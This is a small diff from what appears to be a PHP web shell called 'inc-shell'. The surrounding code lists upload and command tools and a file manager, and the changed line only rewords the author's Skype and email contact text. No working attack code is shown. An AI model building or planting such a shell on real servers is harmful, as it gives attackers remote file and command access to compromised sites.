@@ -305,7 +305,7 @@ function action() {
 	tools("upload");
 	tools("cmd");
 	echo "<td class='td_home'><img src='https://jehovx.github.io/inc-shell/assets/img/inc-mail.png' height='70'>";
-	echo "<td>Contact me at Skype : Incovers Stuff <br> or email incoversstuff[at]gmail.com</td>";
+	echo "<td>Contact Skype : Incovers Stuff <br> or email : incoversstuff[at]gmail.com</td>";
 	echo "</table>";
 	print "<br><center>";
 	print "[ <a href='?'>File Manager</a> ] ";
